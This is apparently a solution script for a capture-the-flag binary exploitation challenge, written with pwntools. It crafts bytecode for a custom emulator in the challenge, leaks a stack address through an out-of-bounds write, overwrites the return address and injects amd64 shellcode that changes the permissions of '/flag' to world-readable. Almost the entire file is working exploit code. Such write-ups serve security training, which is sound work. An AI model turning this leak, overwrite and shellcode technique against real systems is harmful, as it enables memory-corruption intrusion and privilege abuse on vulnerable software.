from pwn import *
from pyrsistent import b 
context.arch='amd64'
reg = {'a': b'\x02' , 'b':b'\x01' , 'c':b'\x40', 'd':b'\x20', 's':b'\x10', 'i':b'\x04', 'f':b'\x08'}
sys = {'imm':b''}
def imm(regNo, imm):
    return reg[regNo] + b'\x10' +  int.to_bytes(imm,1,'little')

def read_300(fd,offset,count,ret_regNo):
    payload = b''
    payload += imm('a',fd) # fd
    payload += imm('b',offset) # buffer_offset
    payload += imm('c',count) # count
    payload += b'\x10\x08'
    payload += reg[ret_regNo]

    return payload 

def read_0(fd,offset,count,ret_regNo):
    payload = b''
    payload += imm('a',fd) # fd
    payload += imm('b',offset) # buffer_offset
    payload += imm('c',count) # count
    payload += b'\x04\x08'
    payload += reg[ret_regNo]

    return payload 

def write_300(fd,offset,count,ret_regNo):
    payload = b''
    payload += imm('a',fd) # fd
    payload += imm('b',offset) # buffer_offset
    payload += imm('c',count) # count
    payload += b'\x02\x08'
    payload += reg[ret_regNo]

    return payload 

def exit(v):
    payload = b''
    payload += imm('a',v)
    payload += b'\x01\x08\x00'

    return payload

r = process('/challenge/toddlerone_level7.0')

payload2=asm('''
    push 90
    pop rax
    lea rdi, [rip+f]
    mov rsi, 511
    syscall

    f:
    .string "/flag"
''')

payload = b''
#payload += read_300(0,0,16,'d')
payload += write_300(1,0xff,0xff,'d')
payload += read_300(0,0xff,0xff,'d')
payload += imm('i',0xff)
r.send(payload)


r.recvuntil(b'... write\n')
r.recv(0x19)
### ret
r.recv(16)
## stack
stack = u64(r.recv(8)) - 232
print(hex(stack))

r.send(b'\x00' + b'\x01'*5 + b'\xff' + b'\x01'*2 + b'\x00'*0x10 + p64(stack) + payload2)



r.interactive()